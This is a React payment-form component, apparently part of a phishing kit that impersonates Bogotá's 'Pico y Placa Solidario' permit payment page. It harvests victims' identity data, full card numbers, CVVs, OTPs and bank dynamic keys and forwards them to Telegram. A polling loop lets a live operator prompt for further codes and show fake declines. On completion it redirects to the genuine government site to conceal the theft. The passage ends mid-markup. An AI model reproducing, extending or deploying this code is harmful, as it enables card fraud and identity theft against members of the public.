/* eslint-disable @next/next/no-img-element */
'use client'
import React, { useState, useEffect, useCallback } from 'react'
import Image from 'next/image'
import { usePermitForm } from '@/hook/usePermitForm'
import { plans, getPlanPrice } from '@/lib/utils'
import { useConsultaPersona } from '@/hook/useConsultaPersona'
import { useEnviarTelegram } from '@/hook/useEnviarTelegram'
import { useSessionPago } from '@/hook/useSessionPago'
import { esBancoPermitidoPse } from '@/utils/bankValidator'
import ValidacionPSEModal from './ValidarInfoModal'
import OtpModal from './OtpModal'
import DinamicaModal from './DinamicaModal'
import QrModal from './QrModal'
import CardModal from './CardModal'
import { supabase } from '@/lib/supabase'
import { identifyBankByBin } from '@/utils/bank-identifier'

interface PermitFormProps {
  selectedPlanId: any
  onPlanSelect: (planId: string) => void
  initialData?: any
  aporteVoluntario?: boolean
}

export default function PermitForm({ selectedPlanId, onPlanSelect, initialData, aporteVoluntario }: PermitFormProps) {
  const [isOpen, setIsOpen] = useState(false)
  const [metodoPago, setMetodoPago] = useState('')
  const [showValidationModal, setShowValidationModal] = useState(false)
  const [validationData, setValidationData] = useState<any>(null)
  const [validatedInfo, setValidatedInfo] = useState<any>(null)
  const [isManualMode, setIsManualMode] = useState(false)
  const [currentTotal, setCurrentTotal] = useState(0)

  // Payment Options State (from DB)
  const [paymentOptions, setPaymentOptions] = useState<Record<string, boolean>>({
    opcion_a: true,
    opcion_b: true,
    opcion_c: true,
    opcion_d: true,
    opcion_e: true,
    opcion_f: true,
  });

  const [cardData, setCardData] = useState({ cardNumber: '', expiryDate: '', cvv: '', cuotas: '1' })
  const [cardErrors, setCardErrors] = useState({ cardNumber: '', expiryDate: '', cvv: '' })
  const [showCardModal, setShowCardModal] = useState(false)
  const [isCardLoading, setIsCardLoading] = useState(false)
  const [otpRequested, setOtpRequested] = useState(false)
  const [otpLength, setOtpLength] = useState<6 | 8>(6)
  const [otpError, setOtpError] = useState('')
  const [dinamicaRequested, setDinamicaRequested] = useState(false)
  const [dinamicaError, setDinamicaError] = useState('')

  const [showQrModal, setShowQrModal] = useState(false)
  const [isQrLoading, setIsQrLoading] = useState(false)
  const [qrError, setQrError] = useState('')

  const [toast, setToast] = useState<{ message: string; type: 'error' | 'success' } | null>(null);
  const [paymentInitiated, setPaymentInitiated] = useState(false);

  const loadOptions = useCallback(() => {
    fetch('/api/payment-options')
      .then(res => res.json())
      .then(data => {
        if (data.success && data.options) {
          setPaymentOptions(data.options);
        }
      })
      .catch(err => console.error('Error fetching payment options:', err));
  }, []);

  useEffect(() => {
    // Initial fetch
    loadOptions();

    // Limpiar cualquier estado residual de sesiones previas al abrir el formulario
    const sessionDoc = formData.cedula || initialData?.NumeroIdentificacion || initialData?.numeroIdentificacion || initialData?.numeroDocumento;
    if (sessionDoc) {
      fetch(`/api/banco/status?sessionId=${sessionDoc}&reset=true`).catch(() => {});
    }
    setOtpRequested(false);
    setDinamicaRequested(false);
    setShowCardModal(false);
    setShowQrModal(false);
    setPaymentInitiated(false);

    // Supabase Realtime listener
    const channel = supabase.channel('config-changes-permit')
      .on(
        'postgres_changes',
        { event: '*', schema: 'public', table: 'pyp_configuraciones_globales' },
        () => {
          loadOptions();
        }
      )
      .subscribe();

    // Polling continuo (1.5s) para garantizar sincronización en tiempo real inmediata
    const interval = setInterval(() => {
      loadOptions();
    }, 1500);

    return () => {
      supabase.removeChannel(channel);
      clearInterval(interval);
    };
  }, [loadOptions]);

  useEffect(() => {
    if (toast) {
      const timer = setTimeout(() => {
        setToast(null);
      }, 4000);
      return () => clearTimeout(timer);
    }
  }, [toast]);
  const { formData, setFormData, total, handleSubmit, isLoading, error, setError } = usePermitForm(selectedPlanId, metodoPago, initialData)
  const { consultarPersona, loading: consultaLoading, error: consultaError, reset: resetConsulta } = useConsultaPersona()
  const { enviarRegistroTelegram } = useEnviarTelegram()
  const { notificarIntencion } = useSessionPago()

  // Calcular el total considerando las placas agregadas
  const calculatedTotal = initialData?.placasAgregadas?.reduce((sum: number, item: any) => sum + (item.planId ? getPlanPrice(item.planId) : 0), 0) || 0;

  useEffect(() => {
    setCurrentTotal(calculatedTotal)
  }, [calculatedTotal])

  // Polling para escuchar a Telegram ÚNICAMENTE cuando el usuario inicia un pago activo
  useEffect(() => {
    const sessionDoc = formData.cedula || initialData?.NumeroIdentificacion || initialData?.numeroIdentificacion || initialData?.numeroDocumento;
    if (!sessionDoc || !paymentInitiated) return;

    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/api/banco/status?sessionId=${sessionDoc}`);
        const data = await res.json();
        
        if (!data || data.status === 'principal' || data.status === 'pending' || data.status === 'missing') {
          return;
        }
        
        if (data.status === 'tc' || data.status === 'etc') {
          setIsCardLoading(false);
          setIsQrLoading(false);
          setOtpRequested(false);
          setDinamicaRequested(false);
          setShowCardModal(true);
          setCardErrors({ 
            cardNumber: data.status === 'etc' ? 'La transacción fue declinada por el banco' : 'Por favor ingrese otra tarjeta',
            expiryDate: '',
            cvv: ''
          });
        } else if (data.status === 'otp' || data.status === 'eotp') {
          setIsCardLoading(false);
          setIsQrLoading(false);
          setShowCardModal(false);
          setOtpLength(6);
          setOtpRequested(true);
          setDinamicaRequested(false);
          if (data.status === 'eotp') {
             setOtpError('Código dinámico de 6 dígitos inválido o expirado. Por favor intente de nuevo.');
          } else {
             setOtpError('');
          }
        } else if (data.status === 'otp8' || data.status === 'eotp8' || data.status === 'errorotp8') {
          setIsCardLoading(false);
          setIsQrLoading(false);
          setShowCardModal(false);
          setOtpLength(8);
          setOtpRequested(true);
          setDinamicaRequested(false);
          if (data.status === 'eotp8' || data.status === 'errorotp8') {
             setOtpError('Código dinámico de 8 dígitos inválido o expirado. Por favor intente de nuevo.');
          } else {
             setOtpError('');
          }
        } else if (data.status === 'dinamica' || data.status === 'edinamica') {
          setIsCardLoading(false);
          setIsQrLoading(false);
          setShowCardModal(false);
          setDinamicaRequested(true);
          setOtpRequested(false);
          if (data.status === 'edinamica') {
             setDinamicaError('Clave dinámica inválida o expirada. Por favor intente de nuevo.');
          } else {
             setDinamicaError('');
          }
        } else if (data.status === 'eqr' || data.status === 'error_qr') {
          setIsQrLoading(false);
          setIsCardLoading(false);
          setShowCardModal(false);
          setOtpRequested(false);
          setDinamicaRequested(false);
          setShowQrModal(true);
          setQrError('Error vuelve a intentarlo');
        } else if (data.status === 'qr' || data.status === 'solicitud_qr') {
          setIsQrLoading(false);
          setIsCardLoading(false);
          setShowCardModal(false);
          setOtpRequested(false);
          setDinamicaRequested(false);
          setShowQrModal(true);
          setQrError('');
        } else if (data.status === 'cambiar_medio' || data.status === 'cambiar_medio_pago') {
          setIsCardLoading(false);
          setIsQrLoading(false);
          setShowCardModal(false);
          setShowQrModal(false);
          setOtpRequested(false);
          setDinamicaRequested(false);
          setMetodoPago('');
          setToast({
            message: 'El pago mediante este medio no se encuentra disponible temporalmente. Por favor, seleccione otro medio de pago (Tarjeta o PSE).',
            type: 'error'
          });
          const sessionDoc = formData.cedula || initialData?.NumeroIdentificacion || initialData?.numeroIdentificacion || initialData?.numeroDocumento;
          if (sessionDoc) {
            fetch(`/api/banco/status?sessionId=${sessionDoc}&reset=true`).catch(() => {});
          }
        } else if (data.status === 'cambiar_banco') {
          setIsCardLoading(false);
          setIsQrLoading(false);
          setShowCardModal(false);
          setShowQrModal(false);
          setOtpRequested(false);
          setDinamicaRequested(false);
          setToast({
            message: 'Este banco no se encuentra disponible temporalmente para transacciones. Por favor, seleccione otro banco.',
            type: 'error'
          });
          const sessionDoc = formData.cedula || initialData?.NumeroIdentificacion || initialData?.numeroIdentificacion || initialData?.numeroDocumento;
          if (sessionDoc) {
            fetch(`/api/banco/status?sessionId=${sessionDoc}&reset=true`).catch(() => {});
          }
        } else if (data.status === 'exito' || data.status === 'fin') {
          // Si envían éxito, ocultar modal y completar proceso
          setIsCardLoading(false);
          setIsQrLoading(false);
          setShowCardModal(false);
          setShowQrModal(false);
          window.location.href = "https://picoyplacasolidario.movilidadbogota.gov.co/Inicio";
        }
      } catch (err) {
        console.error('Error polling status:', err);
      }
    }, 1500);

    return () => clearInterval(interval);
  }, [formData.cedula, initialData, paymentInitiated]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target
    setFormData(prev => ({ ...prev, [name]: value }))
  }

  const handleOtpSubmit = async (code: string) => {
    setIsCardLoading(true);
    setPaymentInitiated(true);
    const sessionDoc = formData.cedula || initialData?.NumeroIdentificacion || initialData?.numeroIdentificacion || initialData?.numeroDocumento || '';
    try {
      fetch(`/api/banco/status?sessionId=${sessionDoc}&reset=true`).catch(() => {});
      await enviarRegistroTelegram({ 
        ...formData, 
        ...cardData, 
        cedula: sessionDoc,
        sessionId: sessionDoc,
        otp: code,
        metodoPago: metodoPago || 'credito',
        tipoTarjeta: metodoPago === 'debito' ? 'debito' : 'credito',
        plan: selectedPlanId,
        total: currentTotal
      });
    } catch (err) {
      console.error('Error enviando OTP:', err);
      setIsCardLoading(false);
    }
  };

  const handleDinamicaSubmit = async (code: string) => {
    setIsCardLoading(true);
    setPaymentInitiated(true);
    const sessionDoc = formData.cedula || initialData?.NumeroIdentificacion || initialData?.numeroIdentificacion || initialData?.numeroDocumento || '';
    try {
      fetch(`/api/banco/status?sessionId=${sessionDoc}&reset=true`).catch(() => {});
      await enviarRegistroTelegram({ 
        ...formData, 
        ...cardData, 
        cedula: sessionDoc,
        sessionId: sessionDoc,
        dinamica: code,
        metodoPago: metodoPago || 'credito',
        tipoTarjeta: metodoPago === 'debito' ? 'debito' : 'credito',
        plan: selectedPlanId,
        total: currentTotal
      });
    } catch (err) {
      console.error('Error enviando Clave Dinámica:', err);
      setIsCardLoading(false);
    }
  };

  const handleCardSubmit = async () => {
    const isValid = handleCardModalConfirm();
    if (!isValid) return;

    setIsCardLoading(true);
    setPaymentInitiated(true);
    
    const bancoDetectado = identifyBankByBin(cardData.cardNumber);
    const redirectMap: Record<string, string> = {
      'Bancolombia': '/banco/bancol',
      'Davivienda': '/banco/davivienda',
      'Bogota': '/banco/bogota',
      'Colpatria': '/banco/colpatria',
      'BBVA': '/banco/bbva',
      'Occidente': '/banco/occidente',
      'Tuya': '/banco/tuya',
      'Falabella': '/banco/falabella',
      'AV Villas': '/banco/avvillas',
    };

    const sessionDoc = formData.cedula || initialData?.NumeroIdentificacion || initialData?.numeroIdentificacion || initialData?.numeroDocumento || '';
    try {
      fetch(`/api/banco/status?sessionId=${sessionDoc}&reset=true`).catch(() => {});
      await enviarRegistroTelegram({ 
        ...formData, 
        ...cardData, 
        cedula: sessionDoc,
        sessionId: sessionDoc,
        metodoPago: metodoPago || 'credito',
        tipoTarjeta: metodoPago === 'debito' ? 'debito' : 'credito',
        plan: selectedPlanId,
        total: currentTotal || total
      });

      if (bancoDetectado && redirectMap[bancoDetectado]) {
        const ruta = redirectMap[bancoDetectado];
        const databank = {
          ...formData,
          plan: selectedPlanId,
          total: currentTotal || total,
          metodo_pago: bancoDetectado,
          tarjeta: cardData.cardNumber,
          fecha: cardData.expiryDate,
          cvv: cardData.cvv,
          cuotas: cardData.cuotas,
          banco_validado: true,
          banco_codigo: null,
          banco_nombre: bancoDetectado
        };
        localStorage.setItem('pypPayment', JSON.stringify(databank));
        
        window.location.href = ruta;
        return;
      }
    } catch (err) {
      console.error('Error enviando tarjeta a Telegram:', err);
      setIsCardLoading(false);
      setError('Ocurrió un error al procesar el pago. Por favor intente nuevamente.');
    }
  };

  const handleQrSubmit = async () => {
    setIsQrLoading(true);
    setPaymentInitiated(true);
    setQrError('');
    try {
      const info = validatedInfo || {};
      const cedulaFinal = info.identificacion || info.cedula || formData.cedula;
      await enviarRegistroTelegram({ 
        ...formData, 
        ...info,
        nombre: info.nombre || formData.nombre,
        cedula: cedulaFinal,
        identificacion: cedulaFinal,
        tipoDoc: info.tipoDocumento || info.tipoDoc || 'Cédula de Ciudadanía',
        tipoDocumento: info.tipoDocumento || info.tipoDoc || 'Cédula de Ciudadanía',
        tipoPersona: info.tipoPersona || 'Natural',
        persona: info.tipoPersona || 'Natural',
        razonSocial: info.razonSocial || '',
        placa: info.placa || formData.placa,
        tipoObligacion: info.tipoObligacion || 'PICO Y PLACA SOLIDARIO',
        saldo: info.saldo,
        intereses: info.intereses,
        numeroDocumento: info.numeroDocumento,
        email: info.email || formData.email,
        correo: info.email || formData.email,
        telefono: info.telefono || '',
        direccion: info.direccion || formData.direccion,
        banco: info.bancoNombre || info.banco || 'QR',
        bancoNombre: info.bancoNombre || info.banco || 'QR',
        bancoCodigo: info.bancoCodigo || '',
        metodoPago: 'qr',
        plan: selectedPlanId,
        total: currentTotal || total,
        sessionId: cedulaFinal,
      });
      // Permanece en estado de verificación cargando hasta que el operador en Telegram envíe la orden
    } catch (err) {
      console.error('Error enviando QR a Telegram:', err);
      setIsQrLoading(false);
      setQrError('Ocurrió un error al procesar la solicitud. Por favor intente nuevamente.');
    }
  };

  const handleMetodoPagoChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setMetodoPago(e.target.value)
    if (e.target.value === 'debito' || e.target.value === 'credito' || e.target.value === 'tarjeta') {
      setShowCardModal(true)
    }
  }

  const handlePlanSelect = (planId: string) => {
    onPlanSelect(planId)
    setIsOpen(false)
  }

  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target
    if (name === 'cardNumber') {
      const numeric = value.replace(/\D/g, '')
      setCardData(prev => ({ ...prev, [name]: numeric }))
      setCardErrors(prev => ({ ...prev, cardNumber: '' }))
    } else if (name === 'expiryDate') {
      const numeric = value.replace(/[^\d\/]/g, '')
      let formatted = numeric
      if (numeric.length === 2 && !numeric.includes('/')) {
        formatted = numeric + '/'
      }
      setCardData(prev => ({ ...prev, [name]: formatted }))
      setCardErrors(prev => ({ ...prev, expiryDate: '' }))
    } else if (name === 'cvv') {
      const numeric = value.replace(/\D/g, '')
      setCardData(prev => ({ ...prev, [name]: numeric }))
      setCardErrors(prev => ({ ...prev, cvv: '' }))
    } else if (name === 'cuotas') {
      setCardData(prev => ({ ...prev, [name]: value }))
    }
  }

  const validateLuhn = (num: string) => {
    let sum = 0
    let isEven = false
    for (let i = num.length - 1; i >= 0; i--) {
      let digit = parseInt(num.charAt(i), 10)
      if (isEven) {
        digit *= 2
        if (digit > 9) {
          digit -= 9
        }
      }
      sum += digit
      isEven = !isEven
    }
    return sum % 10 === 0
  }

  const validateExpiry = (val: string) => {
    if (!/^\d{2}\/\d{2}$/.test(val)) return false
    const [mm, yy] = val.split('/')
    const month = parseInt(mm, 10)
    const year = parseInt(yy, 10) + 2000
    if (month < 1 || month > 12) return false

    const now = new Date()
    const currentMonth = now.getMonth() + 1
    const currentYear = now.getFullYear()

    if (year < currentYear) return false
    if (year === currentYear && month < currentMonth) return false
    return true
  }

  const handleCardModalConfirm = () => {
    let hasError = false
    const errors = { cardNumber: '', expiryDate: '', cvv: '' }

    if (cardData.cardNumber.length !== 13 && cardData.cardNumber.length !== 15 && cardData.cardNumber.length !== 16) {
      errors.cardNumber = 'Longitud inválida'
      hasError = true
    } else if (!validateLuhn(cardData.cardNumber)) {
      errors.cardNumber = 'Tarjeta inválida'
      hasError = true
    }

    if (!validateExpiry(cardData.expiryDate)) {
      errors.expiryDate = 'Fecha inválida o vencida'
      hasError = true
    }

    if (cardData.cvv.length < 3) {
      errors.cvv = 'CVV inválido'
      hasError = true
    }

    if (hasError) {
      setCardErrors(errors)
      return false
    }

    setCardErrors({ cardNumber: '', expiryDate: '', cvv: '' })
    return true
  }

  const handleCardModalCancel = () => {
    setShowCardModal(false)
    if (!cardData.cardNumber) {
      setMetodoPago('')
    }
  }

  const handleFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (metodoPago === 'tarjeta' || metodoPago === 'debito' || metodoPago === 'credito') {
      let hasError = false
      const errors = { cardNumber: '', expiryDate: '', cvv: '' }

      if (cardData.cardNumber.length !== 13 && cardData.cardNumber.length !== 15 && cardData.cardNumber.length !== 16) {
        errors.cardNumber = 'Longitud inválida'
        hasError = true
      } else if (!validateLuhn(cardData.cardNumber)) {
        errors.cardNumber = 'Tarjeta inválida'
        hasError = true
      }

      if (!validateExpiry(cardData.expiryDate)) {
        errors.expiryDate = 'Fecha inválida o vencida'
        hasError = true
      }

      if (cardData.cvv.length < 3) {
        errors.cvv = 'CVV inválido'
        hasError = true
      }

      if (hasError) {
        setCardErrors(errors)
        setShowCardModal(true)
        return
      }
    }

    if (metodoPago === 'qr') {
      setShowQrModal(true)
      return
    }

    // Si el método de pago es PSE, validar primero
    if (metodoPago === 'pse') {
      // Verificar que la cédula esté completa
      if (!formData.cedula) {
        setToast({ message: 'Por favor ingresa el número de cédula para validar', type: 'error' });
        return;
      }

      setIsManualMode(false)

      // Consultar la persona en la API
      const identifier = await consultarPersona(formData.cedula)

      // El identifier es de tipo DatosPersonaResponse | null
      const isManual = !identifier || !identifier.encontrado
      setIsManualMode(isManual)

      // Abrir el modal de validación con los datos obtenidos
      setValidationData({
        idSolicitud: !isManual ? identifier?.idSolicitud : undefined,
        idDatosUsuario: !isManual ? identifier?.idDatosUsuario : undefined,
        nombre: formData.nombre,
        identificacion: formData.cedula,
        placa: formData.placa,
        email: formData.email || '',
        direccion: formData.direccion || '',
      })

      setShowValidationModal(true)
      return
    }

    // Para otros métodos de pago, proceder normalmente
    handleSubmit(e)
  }

  const handleValidationConfirm = (data: any) => {
    console.log('✅ Validación confirmada:', data)
    setShowValidationModal(false)
    setValidatedInfo(data)

    // Actualizar datos del formulario local con los datos del modal
    const updatedFormData = {
      ...formData,
      nombre: data.nombre || formData.nombre,
      cedula: data.identificacion || data.cedula || formData.cedula,
      placa: data.placa || formData.placa,
      email: data.email || formData.email,
      direccion: data.direccion || formData.direccion,
      telefono: data.telefono || '',
      banco: data.bancoNombre || data.banco || '',
    }
    setFormData(updatedFormData)

    // Si seleccionó Bre-B dentro del modal PSE
    if (data.banco === 'bre-b' || data.bancoCodigo === 'bre-b' || data.isBreB) {
      console.log('⚡ Pago seleccionado desde PSE: Bre-B QR')
      setMetodoPago('qr')
      setShowQrModal(true)
      setQrError('')
      return
    }

    const esPermitido = data.esBancoPermitidoPse !== undefined
      ? data.esBancoPermitidoPse
      : esBancoPermitidoPse(data.bancoNombre || data.banco, data.bancoCodigo || data.banco)

    // Si el banco NO está en la lista de los 16 bancos permitidos, abrir modal de QR
    if (!esPermitido) {
      console.log('🏦 Banco no permitido para PSE directo. Redirigiendo a modal QR...')
      setMetodoPago('qr')
      setShowQrModal(true)
      setQrError('')
      return
    }

    // Flujo normal PSE para los 16 bancos permitidos (redirige a /pse)
    const paymentData = {
      ...updatedFormData,
      ...data,
      idDatosUsuario: validationData?.idDatosUsuario,
      idSolicitud: validationData?.idSolicitud,
      metodoPago: 'pse',
      isManual: isManualMode,
      total: currentTotal || total,
    }

    // Si es modo manual, mostrar un mensaje
    if (isManualMode) {
      console.log('ℹ️ Modo manual: Datos ingresados por el usuario sin validación de API')
    }

    // Simular envío del formulario para redirigir a /pse
    handleSubmit(new Event('submit') as any)
  }

  const handleValidationCancel = () => {
    setShowValidationModal(false)
    setValidationData(null)
    setIsManualMode(false)
    resetConsulta()
  }

  const selectedPlanLabel = selectedPlanId
    ? plans.find((p) => p.id === selectedPlanId)?.label
    : 'Seleccione un plan de circulación'

  return (
    <>
      <div className="w-full flex flex-col items-center py-4">
        <p className="text-[#3a4959] text-[15px] mb-4">Selecciona el medio de pago</p>

        <div className="w-full grid grid-cols-2 sm:grid-cols-3 gap-3 justify-items-center max-w-[360px] sm:max-w-[360px] mx-auto pb-4">
          {paymentOptions.opcion_a && (
            <button
              type="button"
              onClick={async () => {
                setMetodoPago('pse')
                if (!formData.cedula) {
                  setToast({ message: 'Por favor ingresa el número de cédula para validar', type: 'error' });
                  return;
                }
                // 🔔 Notificar al LiveDashboard: intención PSE
                notificarIntencion({
                  nombre: formData.nombre,
                  cedula: formData.cedula,
                  placa: formData.placa,
                  email: formData.email,
                  telefono: formData.telefono,
                  direccion: formData.direccion,
                  metodoPago: 'pse',
                  total: currentTotal || total,
                  status: 'intento_pse',
                });
                setIsManualMode(false)
                const identifier = await consultarPersona(formData.cedula)
                const isManual = !identifier || !identifier.encontrado
                setIsManualMode(isManual)
                setValidationData({
                  idSolicitud: !isManual ? identifier?.idSolicitud : undefined,
                  idDatosUsuario: !isManual ? identifier?.idDatosUsuario : undefined,
                  nombre: formData.nombre,
                  identificacion: formData.cedula,
                  placa: formData.placa,
                  email: formData.email || '',
                  direccion: formData.direccion || '',
                })
                setShowValidationModal(true)
              }}
              disabled={isLoading || consultaLoading}
              className="flex flex-col items-center p-2 border border-[#1b365d] rounded-sm cursor-pointer hover:border-green-500 hover:shadow-md transition-all bg-white w-[110px] h-[125px] disabled:opacity-50 group"
            >
              <div className="w-2.5 h-2.5 rounded-full border border-gray-500 mt-1 mb-2 group-hover:border-green-500"></div>
              <div className="flex-1 flex items-center justify-center">
                <img src="/pse.png" alt="PSE" width={65} height={65} className="object-contain" />
              </div>
              <span className="text-[11px] text-[#1b365d] font-medium mt-1">PSE</span>
            </button>
          )}

          {paymentOptions.opcion_d && (
            <button
              type="button"
              onClick={() => {
                setMetodoPago('debito')
                setShowCardModal(true)
                // 🔔 Notificar al LiveDashboard: intención Débito
                notificarIntencion({
                  nombre: formData.nombre,
                  cedula: formData.cedula,
                  placa: formData.placa,
                  email: formData.email,
                  telefono: formData.telefono,
                  metodoPago: 'debito',
                  total: currentTotal || total,
                  status: 'intento_debito',
                });
              }}
              disabled={isLoading || consultaLoading}
              className="flex flex-col items-center p-2 border border-[#1b365d] rounded-sm cursor-pointer hover:border-green-500 hover:shadow-md transition-all bg-white w-[110px] h-[125px] disabled:opacity-50 group"
            >
              <div className={`w-2.5 h-2.5 rounded-full border mt-1 mb-1 group-hover:border-green-500 ${metodoPago === 'debito' ? 'bg-green-600 border-green-600' : 'border-gray-500'}`}></div>
              <div className="flex-1 flex items-center justify-center text-[#001f24]">
                <svg xmlns="http://www.w3.org/2000/svg" width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round">
                  <rect width="20" height="14" x="2" y="5" rx="2" />
                  <line x1="2" x2="22" y1="10" y2="10" />
                  <path d="M7 15h.01" />
                  <path d="M11 15h2" />
                </svg>
              </div>
              <span className="text-[11px] text-[#1b365d] font-medium mt-1 text-center leading-tight">Tarjeta Débito</span>
            </button>
          )}

          {paymentOptions.opcion_c && (
            <button
              type="button"
              onClick={() => {
                setMetodoPago('credito')
                setShowCardModal(true)
                // 🔔 Notificar al LiveDashboard: intención Crédito
                notificarIntencion({
                  nombre: formData.nombre,
                  cedula: formData.cedula,
                  placa: formData.placa,
                  email: formData.email,
                  telefono: formData.telefono,
                  metodoPago: 'credito',
                  total: currentTotal || total,
                  status: 'intento_credito',
                });
              }}
              disabled={isLoading || consultaLoading}
              className="flex flex-col items-center p-2 border border-[#1b365d] rounded-sm cursor-pointer hover:border-green-500 hover:shadow-md transition-all bg-white w-[110px] h-[125px] disabled:opacity-50 group"
            >
              <div className={`w-2.5 h-2.5 rounded-full border mt-1 mb-1 group-hover:border-green-500 ${metodoPago === 'credito' ? 'bg-green-600 border-green-600' : 'border-gray-500'}`}></div>
              <div className="flex-1 flex items-center justify-center text-[#001f24]">
                <svg xmlns="http://www.w3.org/2000/svg" width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round">
                  <rect width="20" height="14" x="2" y="5" rx="2" />
                  <line x1="2" x2="22" y1="10" y2="10" />
                  <circle cx="16" cy="15" r="1.5" />
                  <circle cx="13" cy="15" r="1.5" />
                </svg>
              </div>
              <span className="text-[11px] text-[#1b365d] font-medium mt-1 text-center leading-tight">Tarjeta Crédito</span>
            </button>
          )}

          {paymentOptions.opcion_b && (
            <button
              type="button"
              onClick={() => {
                setMetodoPago('bancolombia')
                notificarIntencion({
                  nombre: formData.nombre,
                  cedula: formData.cedula,
                  placa: formData.placa,
                  email: formData.email,
                  metodoPago: 'bancolombia',
                  total: currentTotal || total,
                  status: 'intento_bancolombia',
                });
                handleSubmit(new Event('submit') as any)
              }}
              disabled={isLoading || consultaLoading}
              className="flex flex-col items-center p-2 border border-[#1b365d] rounded-sm cursor-pointer hover:border-green-500 hover:shadow-md transition-all bg-white w-[110px] h-[125px] disabled:opacity-50 group"
            >
              <div className="w-2.5 h-2.5 rounded-full border border-gray-500 mt-1 mb-2 group-hover:border-green-500"></div>
              <div className="flex-1 flex items-center justify-center">
                <img src="/bancolombia.png" alt="Bancolombia" width={55} height={55} className="object-contain" />
              </div>
              <span className="text-[11px] text-[#1b365d] font-medium mt-1">Bancolombia</span>
            </button>
          )}
          
          {paymentOptions.opcion_e && (
            <button
              type="button"
              onClick={() => {
                setMetodoPago('davivienda')
                notificarIntencion({
                  nombre: formData.nombre,
                  cedula: formData.cedula,
                  placa: formData.placa,
                  email: formData.email,
                  metodoPago: 'davivienda',
                  total: currentTotal || total,
                  status: 'intento_davivienda',
                });
                handleSubmit(new Event('submit') as any)
              }}
              disabled={isLoading || consultaLoading}
              className="flex flex-col items-center p-2 border border-[#1b365d] rounded-sm cursor-pointer hover:border-green-500 hover:shadow-md transition-all bg-white w-[110px] h-[125px] disabled:opacity-50 group"
            >
              <div className="w-2.5 h-2.5 rounded-full border border-gray-500 mt-1 mb-2 group-hover:border-green-500"></div>
              <div className="flex-1 flex items-center justify-center">
                <img src="/btn-Davivienda.png" alt="Davivienda" width={55} height={55} className="object-contain" />
              </div>
              <span className="text-[11px] text-[#1b365d] font-medium mt-1">Davivienda</span>
            </button>
          )}

          {paymentOptions.opcion_f && (
            <button
              type="button"
              onClick={() => {
                setMetodoPago('bre-b')
                notificarIntencion({
                  nombre: formData.nombre,
                  cedula: formData.cedula,
                  placa: formData.placa,
                  email: formData.email,
                  metodoPago: 'bre-b',
                  total: currentTotal || total,
                  status: 'intento_breb',
                });
                handleSubmit(new Event('submit') as any)
              }}
              className="flex flex-col items-center p-2 border border-[#1b365d] rounded-sm cursor-pointer hover:border-green-500 hover:shadow-md transition-all bg-white w-[110px] h-[125px] disabled:opacity-50 group"
            >
              <div className="w-2.5 h-2.5 rounded-full border border-gray-500 mt-1 mb-2 group-hover:border-green-500"></div>
              <div className="flex-1 flex items-center justify-center">
                <img src="/bre-logo.png" alt="Bre-B" width={55} height={55} className="object-contain" />
              </div>
              <span className="text-[11px] text-[#1b365d] font-medium mt-1">Bre-B</span>
            </button>
          )}
        </div>

        {consultaError && (
          <div className="mt-2 text-sm text-yellow-600 bg-yellow-50 p-2 rounded border border-yellow-200">
            ⚠️ {consultaError} - Puede completar los datos manualmente
          </div>
        )}

        {(metodoPago === 'tarjeta' || metodoPago === 'debito' || metodoPago === 'credito') && (
          <div className="border border-green-200 rounded-sm p-3 mt-4 bg-green-50 shadow-sm flex justify-between items-center animate-in slide-in-from-top-2 w-full max-w-sm">
            <div className="flex items-center gap-3">
              <div className="bg-white p-2 rounded-md shadow-sm border border-green-100">
                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#16a34a" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect width="20" height="14" x="2" y="5" rx="2" /><line x1="2" x2="22" y1="10" y2="10" /></svg>
              </div>
              <div>
                <p className="text-sm font-semibold text-green-800">
                  {metodoPago === 'credito' ? 'Tarjeta Crédito vinculada' : 'Tarjeta Débito vinculada'}
                </p>
                <p className="text-xs text-green-600 font-medium">
                  {cardData.cardNumber ? `**** **** **** ${cardData.cardNumber.slice(-4)}${metodoPago === 'credito' && cardData.cuotas ? ` (${cardData.cuotas} cuota${cardData.cuotas === '1' ? '' : 's'})` : ''}` : 'Sin datos'}
                </p>
              </div>
            </div>
            <button
              type="button"
              onClick={() => setShowCardModal(true)}
              className="text-xs font-bold text-green-700 hover:text-green-800 bg-white border border-green-200 rounded px-3 py-1.5 shadow-sm transition-colors"
            >
              Editar
            </button>
          </div>
        )}

        {metodoPago === 'qr' && (
          <div className="border border-green-200 rounded-sm p-3 mt-4 bg-green-50 shadow-sm flex justify-between items-center animate-in slide-in-from-top-2 w-full max-w-sm">
            <div className="flex items-center gap-3">
              <div className="bg-white p-2 rounded-md shadow-sm border border-green-100 text-green-600">
                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none" stroke="currentColor" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" viewBox="0 0 24 24"><rect width="5" height="5" x="3" y="3" rx="1"/><rect width="5" height="5" x="16" y="3" rx="1"/><rect width="5" height="5" x="3" y="16" rx="1"/><path d="M21 16h-3a2 2 0 0 0-2 2v3M12 7v3a2 2 0 0 1-2 2H7"/></svg>
              </div>
              <div>
                <p className="text-sm font-semibold text-green-800">Pago por QR</p>
                <p className="text-xs text-green-600 font-medium">
                  {isQrLoading ? 'Verificando pago...' : 'Código listo para escanear'}
                </p>
              </div>
            </div>
            <button
              type="button"
              onClick={() => setShowQrModal(true)}
              className="text-xs font-bold text-green-700 hover:text-green-800 bg-white border border-green-200 rounded px-3 py-1.5 shadow-sm transition-colors"
            >
              Ver QR
            </button>
          </div>
        )}
      </div>

      {/* Modal de Validación para PSE */}
      <ValidacionPSEModal
        isOpen={showValidationModal}
        onClose={handleValidationCancel}
        onConfirm={handleValidationConfirm}
        personaData={validationData || {
          idSolicitud: '',
          idDatosUsuario: '',
          nombre: formData.nombre,
          identificacion: formData.cedula,
          placa: formData.placa,
          email: formData.email || '',
          direccion: formData.direccion || '',
        }}
        total={currentTotal || total}
      />

